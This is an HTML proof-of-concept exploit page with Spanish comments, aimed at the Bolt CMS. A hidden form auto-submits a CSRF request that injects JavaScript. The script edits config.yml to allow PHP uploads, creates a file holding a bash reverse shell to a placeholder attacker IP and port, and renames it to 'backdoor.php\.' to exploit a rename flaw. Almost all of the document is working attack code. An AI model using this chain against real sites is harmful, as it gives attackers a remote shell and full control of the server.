
<html>
<body>


<form id="csrfform" method="POST" action="http://prueba.bolt/preview/page">  <!--url con ejecución CSRF en función preview() -->
<input type=hidden name="contenttype" value="pages">
<input type=hidden name="title" value="Preview Page">
<input type=hidden name="slug" value="previewpage1">
<input type=hidden name="teaser" value="This is just a preview page">
<textarea type=hidden name="body">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<!-- javascript empieza acá -->
<script>

//cambiar target por url raíz bolt
var target = 'http://prueba.bolt';

//cambiar por dashboard Bolt
var admin_url = '/bolt';

// edita config.yml y agrega php a las extensiones permitidas para subir
$.get(target+admin_url+'/file/edit/config/config.yml', function( my_var0 ) {

	var tokenobj0 = $(my_var0).find('#file_edit__token'); //obtiene token
	var configfile = $(my_var0).find("#file_edit_contents")[0].defaultValue;
	var extensionsline = configfile.match("accept_file_types: (.*)]");
	var editedconfigfile = configfile.replace(extensionsline[0], "accept_file_types: "+extensionsline[1]+", php ]");

	$.ajax({
		type: 'POST',
		url: target+admin_url+'/file/edit/config/config.yml?returnto=ajax',
		data: {
			'file_edit[_token]':tokenobj0[0].value,
			'file_edit[contents]':editedconfigfile,
			'file_edit[save]':'undefined'
		}
	});
}, 'html');

$.ajaxSetup({async: false});

// crea backdoor.txt en /files
$.get(target+admin_url+"/files", function( my_var1 ) {


	var tokenobj1 = $(my_var1).find(".dropdown-menu.pull-right.hidden-xs").first().find("li:first-child").find("a:first-child").data().action.slice(22,-2).split(', ')[3].slice(1,-1); //obtiene token

	$.ajax({
		type: 'POST',
		url: target+'/async/file/create',
		data: {
			'filename': 'backdoor.txt',
			'parentPath': '',
			'namespace': 'files',
			'token': tokenobj1
		}
	});
}, 'html');

// edita backdoor.txt
$.get(target+admin_url+"/file/edit/files/backdoor.txt", function( my_var2 ) {

	var tokenobj2 = $(my_var2).find("#file_edit__token")[0].defaultValue;

	$.ajax({
		type: 'POST',
		url: target+admin_url+'/file/edit/files/backdoor.txt?returnto=ajax',
		data: {
			'file_edit[_token]': tokenobj2,
			'file_edit[contents]': `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IPATACANTE/PUERTOATACANTE 0>&1'");`, //reverse shell para acceder por nc
			'file_edit[save]': 'undefined'
		}
	});
}, 'html');

// renombra backdoor.txt a backdoor.php\.
$.get(target+admin_url+"/files", function( my_var3 ) {

	var tokenobj3 = $(my_var3).find(".dropdown-menu.pull-right.hidden-xs").first().find("li:first-child").find("a:first-child").data().action.slice(22,-2).split(', ')[3].slice(1,-1); //obtiene token

	$.ajax({
		type: 'POST',
		url: target+'/async/file/rename',
		data: {
			'namespace': 'files',
			'parent': '',
			'oldname': 'backdoor.txt',
			'newname': 'backdoor.php\\.', //renombre especial para hacer uso vulnerabilidad
			'token': tokenobj3
		}
	});
}, 'html');
</script>
<!-- javascript exploit termina acá -->
</textarea>
<input type=hidden name="id" value="1337">
<input type=submit value=submit id="submitbutton">
</form>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script type="text/javascript">
$(function() {
    $('#submitbutton').click();
    window.alert()
});

</script>

</body>
</html>